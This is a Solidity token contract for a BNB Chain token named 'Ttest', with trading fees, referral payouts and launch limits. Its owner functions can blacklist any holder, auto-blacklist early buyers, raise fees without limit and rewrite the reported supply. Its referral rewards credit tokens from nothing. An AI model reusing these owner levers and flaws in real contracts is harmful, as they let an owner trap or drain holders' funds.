/**
 *Submitted for verification at BscScan.com on 2022-03-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

contract Ttest is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    mapping(address => uint256) private _swaptime;
    uint256 public _limitTime = 24*60*60;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _burnTotal;
    uint256 private _burnTotalend;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;

    string private _name;
    string private _symbol;
    uint256 private _decimals;

    uint256 public _baseFee = 1000;

    uint256 public _buyswapFee = 30;
    uint256 public _sellswapFee = 50;
    uint256 public _lpFee = 30;
    uint256 public _markFee = 30;

    uint256 public _burnFee = 3;

    uint256 public _liquidityFee = 1;

    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);

    uint256 public tradingEnabledTimestamp = 1648785600; //2022-04-01 12:00:00   
    uint256 public tradingEnabledTimestampAfter15 = 1649995200; //2022-04-15 12:00:00   

    mapping(address => address) public inviter;
    mapping(address => uint256) public lastSellTime;
    mapping(address => bool) public _isBlacklisted;

    uint256 public _maxBuyAmount;
    uint256 public _maxAmount;

    address public uniswapV2Pair;
	address public uniswapV2Pair2;
	address public uniswapV2Pair3;
	address public uniswapV2Pair4;
    address public _fundAddressA;
    address public _fundAddressB;
	address public _fundAddressC;
	address public _fundAddressD;
	
    constructor(address tokenOwner,address fundAddressA,address fundAddressB,address fundAddressC ) {
        _name = "Ttest";
        _symbol = "Ttest";
        _decimals = 9;

        _tTotal = 24000 * 10**_decimals;
        
        _rTotal = (MAX - (MAX % _tTotal));
        _burnTotal = _tTotal;
        _burnTotalend = 10000 * 10**_decimals;

        _maxBuyAmount = 1 * (10 ** 9);
        _maxAmount=200 * 10**_decimals;

        _rOwned[tokenOwner] = _tTotal;
        _isExcludedFromFee[tokenOwner] = true;
        
        _fundAddressA = fundAddressA;
        _fundAddressB = fundAddressB;
		_fundAddressC = fundAddressC;
		
		
        _owner = msg.sender;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _burnTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        //return tokenFromReflection(_rOwned[account]);
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
       
        require(!_isBlacklisted[from], "Blacklisted address"); 

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(balanceOf(from)>=amount,"YOU HAVE insuffence balance");
       

        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            _tokenTransfer(from, to, amount);
        }else{
			if(from == uniswapV2Pair){
				_tokenTransferBuy(from, to, amount);
			}else if(to == uniswapV2Pair){
				_tokenTransferSell(from, to, amount);
			}else if(from == uniswapV2Pair2){
				_tokenTransferBuy(from, to, amount);
			}else if(to == uniswapV2Pair2){
				_tokenTransferSell(from, to, amount);
			}else if(from == uniswapV2Pair3){
				_tokenTransferBuy(from, to, amount);
			}else if(to == uniswapV2Pair3){
				_tokenTransferSell(from, to, amount);
			}else if(from == uniswapV2Pair4){
				_tokenTransferBuy(from, to, amount);
			}else if(to == uniswapV2Pair4){
				_tokenTransferSell(from, to, amount);
			}else{
                
				_tokenTransfer(from, to, amount);
			}
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        
        bool shouldSetInviter = 
            inviter[recipient] == address(0) &&
            sender != uniswapV2Pair&&
            sender != uniswapV2Pair2&&
            sender != uniswapV2Pair3&&
            sender != uniswapV2Pair4&&
            tAmount >= 1 * 10 **5;
            
        if (shouldSetInviter) {
            inviter[recipient] = sender;
        }
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        emit Transfer(sender, recipient, tAmount);
    }


    function _tokenTransferBuy(
        address sender,
        address recipient,
        uint256 tAmount
		
    ) private {

        bool tradingIsEnabled = getTradingIsEnabled();
        require(tradingIsEnabled, "Time is not up");

        if (
            tradingIsEnabled &&                  //start time
           block.timestamp <= tradingEnabledTimestamp + 9 seconds) {  //bot 
            addBot(recipient);                                 //add black
        }

        if(tradingEnabledTimestampAfter15>block.timestamp){
            require(tAmount <= _maxBuyAmount,"Transfer amount exceeds the maxBuyAmount.");
            require(balanceOf(recipient) < _maxAmount,"Transfer amount exceeds the maxWalletAmount.");
            require(balanceOf(recipient).add(tAmount) < _maxAmount,"wallAmount is exceeds the maxWalletAmount");

           
            bool Limited = (_limitTime+_swaptime[recipient]) < block.timestamp;
            require(Limited,"Transaction interval is too short.");
        }
         

        uint256 currentRate = _getRate();

        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
 
		_takeTransfer(
			sender,
			_fundAddressA,//swapfee
			tAmount.div(_baseFee).mul(_buyswapFee),
			currentRate
		);
		_takeTransfer(
			sender,
			_fundAddressB,
			tAmount.div(_baseFee).mul(_lpFee),//lpfee
			currentRate
		);
        
		_takeTransfer(
			sender,
			_fundAddressC,
			tAmount.div(_baseFee).mul(_markFee),//markfee
			currentRate
		);

    uint256 sumbuyfee;
    if(_burnTotal>_burnTotalend){
        _takeTransfer(
			sender,
			_destroyAddress,
			tAmount.div(_baseFee).mul(_burnFee),
			currentRate
		);
        _burnTotal=_burnTotal-tAmount.div(_baseFee).mul(_burnFee);
        sumbuyfee=_baseFee-_buyswapFee-_lpFee-_markFee-_burnFee;
    }else{
        sumbuyfee=_baseFee-_buyswapFee-_lpFee-_markFee;
    }

        
		
            
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(_baseFee).mul(sumbuyfee)
        );
        _swaptime[recipient]=block.timestamp;
        emit Transfer(sender, recipient, tAmount.div(_baseFee).mul(sumbuyfee));


        uint256 markfeetotal=tAmount.div(_baseFee).mul(_markFee);
        address cur;
        cur = recipient;
        uint256 accurRate;
        for (int256 i = 0; i < 8; i++) {
            uint256 rate;
            if (i == 0) {
                rate = 30;
            } else if(i == 1){
                rate = 20;
            } else if(i == 2 ){
                rate = 10;
            } else {
                rate = 5;
            }
            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }
            accurRate = accurRate.add(rate);

            uint256 curTAmount = markfeetotal.div(_baseFee).mul(rate);
            _rOwned[cur] = _rOwned[cur].add(curTAmount);
            emit Transfer(sender, cur, curTAmount);
        }

    }
    
    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount
		
    ) private {
        uint256 currentRate = _getRate();

        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
 
		_takeTransfer(
			sender,
			_fundAddressA,//swapfee
			tAmount.div(_baseFee).mul(_sellswapFee),
			currentRate
		);
		_takeTransfer(
			sender,
			_fundAddressB,
			tAmount.div(_baseFee).mul(_lpFee),//lpfee
			currentRate
		);
        
		_takeTransfer(
			sender,
			_fundAddressC,
			tAmount.div(_baseFee).mul(_markFee),//markfee
			currentRate
		);

    uint256 sumsellfee;
    if(_burnTotal>_burnTotalend){
        _takeTransfer(
			sender,
			_destroyAddress,
			tAmount.div(_baseFee).mul(_burnFee),
			currentRate
		);
        _burnTotal=_burnTotal-tAmount.div(_baseFee).mul(_burnFee);
        sumsellfee=_baseFee-_sellswapFee-_lpFee-_markFee-_burnFee;
    }else{
        sumsellfee=_baseFee-_sellswapFee-_lpFee-_markFee;
    }
        
		
		
            
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(_baseFee).mul(sumsellfee)
        );
        emit Transfer(sender, recipient, tAmount.div(_baseFee).mul(sumsellfee));


        uint256 markfeetotal=tAmount.div(_baseFee).mul(_markFee);
        address cur;
        cur = sender;
        uint256 accurRate;
        for (int256 i = 0; i < 8; i++) {
            uint256 rate;
            if (i == 0) {
                rate = 30;
            } else if(i == 1){
                rate = 20;
            } else if(i == 2 ){
                rate = 10;
            } else {
                rate = 5;
            }
            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }
            accurRate = accurRate.add(rate);

            uint256 curTAmount = markfeetotal.div(_baseFee).mul(rate);
            _rOwned[cur] = _rOwned[cur].add(curTAmount);
            emit Transfer(sender, cur, curTAmount);
        }


    }


    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }

    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
	function changeRouter2(address router) public onlyOwner {
        uniswapV2Pair2 = router;
    }
	function changeRouter3(address router) public onlyOwner {
        uniswapV2Pair3 = router;
    }
	function changeRouter4(address router) public onlyOwner {
        uniswapV2Pair4 = router;
    }
    function changeA(address _AddressA) public onlyOwner {
        _fundAddressA = _AddressA;
    }
    function changeB(address _AddressB) public onlyOwner {
        _fundAddressB = _AddressB;
    }
    function changeC(address _AddressC) public onlyOwner {
        _fundAddressC = _AddressC;
    }
    function changeD(address _AddressD) public onlyOwner {
        _fundAddressD = _AddressD;
    }

    function setMaxBuyAmount(uint256 newMax) public onlyOwner(){
         _maxBuyAmount = newMax;
    }

     function setMaxAmount(uint256 newMax2) public onlyOwner(){
         _maxAmount = newMax2;
    }

     function getTradingIsEnabled() public view returns (bool) {
        return block.timestamp >= tradingEnabledTimestamp;
    }

     function setTradingIsEnabled(uint256 _time)  public onlyOwner(){
         tradingEnabledTimestamp=_time;
    }
     function setAfter15time(uint256 _time2)  public onlyOwner(){
         tradingEnabledTimestampAfter15=_time2;
    }
     function setbuyswapfee(uint256 buyfee)  public onlyOwner(){
         _buyswapFee=buyfee;
    }
     function setsellswapfee(uint256 sellfee)  public onlyOwner(){
         _sellswapFee=sellfee;
    }
     function setlpfee(uint256 lpfee)  public onlyOwner(){
         _lpFee=lpfee;
    }
     function setmarkfee(uint256 markfee)  public onlyOwner(){
         _markFee=markfee;
    }
     function setburnfee(uint256 burnfee)  public onlyOwner(){
         _burnFee=burnfee;
    }
     function blacklistAddress(address account, bool value) external onlyOwner {
        _isBlacklisted[account] = value;   //true is black
    }
    function addBot(address recipient) private {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }
    function setLimitedTime(uint256 newTime) public onlyOwner(){
        _limitTime = newTime;
    }
    function setburntotal(uint256 num) public onlyOwner(){
        _burnTotal = num * 10**_decimals;
    }
}